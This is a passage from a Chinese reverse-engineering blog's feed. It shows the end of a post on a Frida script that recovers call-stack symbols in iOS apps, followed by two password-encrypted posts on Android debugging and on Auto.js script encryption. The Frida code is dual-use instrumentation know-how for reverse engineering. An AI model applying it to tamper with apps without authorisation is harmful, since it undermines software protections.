symbolish mainModule address false:symbolish all module address]                            xia0CallStackSymbols(true);                            xia0CallStackSymbols(false);                        }                    });            }            catch(err)            {                    console.log(&quot;[!] Exception2: &quot; + err.message);            }    }    else    {            console.log(&quot;Objective-C Runtime is not available!&quot;);    }    &#39;&#39;&#39;    return source+jsdef do_hook():    return xia0CallStackSymbolsTest()if __name__ == &#39;__main__&#39;:    try:        device = frida.get_device_manager().enumerate_devices()[-1]        print device        pid = device.spawn([PACKAGE_NAME])        print(&quot;[JSBACH] {} is starting. (pid : {})&quot;.format(PACKAGE_NAME, pid))        session = device.attach(pid)        device.resume(pid)        script = session.create_script(do_hook())        script.on(&#39;message&#39;, on_message)        script.load()        sys.stdin.read()    except KeyboardInterrupt:        sys.exit(0)</code></pre><p>只需要将<code>xia0CallStackSymbols.js</code>脚本放到项目中，然后用以下代码即可导入使用</p><pre><code class="python">script_dir = os.path.dirname(os.path.realpath(__file__))xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)source = &#39;&#39;with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:    source = source + f.read()your_frida_js_hook_script = &quot;&quot;load_js = your_frida_js_hook_script+source</code></pre><p>恢复的效果如下：</p><ul><li><p>通过<code>[NSThread callStackSymbols]</code>获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181519237.png?raw=true" alt="image-20190702181519237"></p></li><li><p>通过调用<code>xia0CallStackSymbols</code>函数获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181145710.png?raw=true" alt="image-20190702181145710"></p></li><li><p>作为比较，我在放上lldb中恢复调用栈</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181638614.png?raw=true" alt="image-20190702181638614"></p></li></ul><p>这里可以看出lldb调试器恢复的符号信息最完整且准确，lldb的栈符号恢复项目在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a>，现在还能支持block函数的符号恢复。</p><p>这里有几个问题需要说明一下：</p><ul><li><p>xia0CallStackSymbols的符号为什么前15个地址没有显示？</p><p>因为前15个地址都是frida中js解释器里面的函数执行地址，没有办法拿到模块信息，也没必要解析这些地址。</p></li><li><p>xia0CallStackSymbols中还提供了内存对应的文件地址，如果你觉得符号有问题，可以直接去ida中手动查找符号</p></li><li><p>如果用dladdr能够拿到地址的符号信息，就没有调用xia0CallStackSymbols去恢复(比如符号表没有strip的情况)</p></li><li><p>xia0CallStackSymbols()接口可以传递一个bool参数，true为仅仅解析主模块的地址，false为所有模块都需要解析。实际在逆向过程中一般只需要主模块的符号信息，其他系统函数没很大必要。</p></li></ul><h4 id="遗留问题-Todo"><a href="#遗留问题-Todo" class="headerlink" title="遗留问题/Todo"></a>遗留问题/Todo</h4><ul><li>在执行恢复符号的过程中时间相对较长，主要原因在于每一个地址都要和所有方法比较，这里建议xia0CallStackSymbols传入true，这样只解析主模块的地址。耗时的原因还在于每一个地址解析的时候都会去调用接口获取所有方法信息，实际上每个模块只需要一次就能拿到所有方法信息，接下来要做的就是优化相关代码，缓存模块的所有方法信息，下次解析的地址为该模块时直接去缓存里面匹配查找。</li><li>在匹配符号的过程中，判断是否为C函数需要更多的原则，3000的阈值需要后面再调下。</li><li>关于block的符号恢复，目前只有在lldb中实现了，下一步准备在xia0CallStackSymbols中也支持恢复block函数符号</li></ul><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>短视频下载去水印如果有人感兴趣的话，可以点<a href="https://github.com/4ch12dy/fkwatermark">这里</a>，目前支持的有皮皮搞笑、抖音（我不看抖音！）</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://github.com/poxyran/misc">https://github.com/poxyran/misc</a></li><li>&lt; <a href="https://github.com/iddoeldor/frida-snippets">https://github.com/iddoeldor/frida-snippets</a> &gt;</li><li><a href="http://www.blogfshare.com/ioss-validate-address.html" target="_blank" rel="external">http://www.blogfshare.com/ioss-validate-address.html</a></li><li><a href="https://jmpews.github.io/2017/08/09/darwin/反注入及绕过/" target="_blank" rel="external">https://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</a></li><li><a href="https://github.com/interference-security/frida-scripts">https://github.com/interference-security/frida-scripts</a></li><li><a href="https://github.com/dweinstein/awesome-frida">https://github.com/dweinstein/awesome-frida</a></li><li><a href="https://www.frida.re/docs/javascript-api/" target="_blank" rel="external">https://www.frida.re/docs/javascript-api/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Frida调用栈符号恢复&quot;&gt;&lt;a href=&quot;#Frida调用栈符号恢复&quot; class=&quot;headerlink&quot; title=&quot;Frida调用栈符号恢复&quot;&gt;&lt;/a&gt;Frida调用栈符号恢复&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot; class=&quot;
      
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="frida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/frida/"/>
    
      <category term="iosre" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/iosre/"/>
    
  </entry>
  
  <entry>
    <title>andoid调试深度总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid%E8%B0%83%E8%AF%95%E6%B7%B1%E5%BA%A6%E6%80%BB%E7%BB%93/andoid%E8%B0%83%E8%AF%95%E6%B7%B1%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid调试深度总结/andoid调试深度总结/</id>
    <published>2019-06-04T14:54:21.000Z</published>
    <updated>2019-06-05T06:57:29.464Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Android Auto.js脚本加密分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs加密分析/autojs加密分析/</id>
    <published>2019-04-25T07:12:09.000Z</published>
    <updated>2019-04-30T02:52:18.678Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="show me the code" />    <label for="pass">show me the code</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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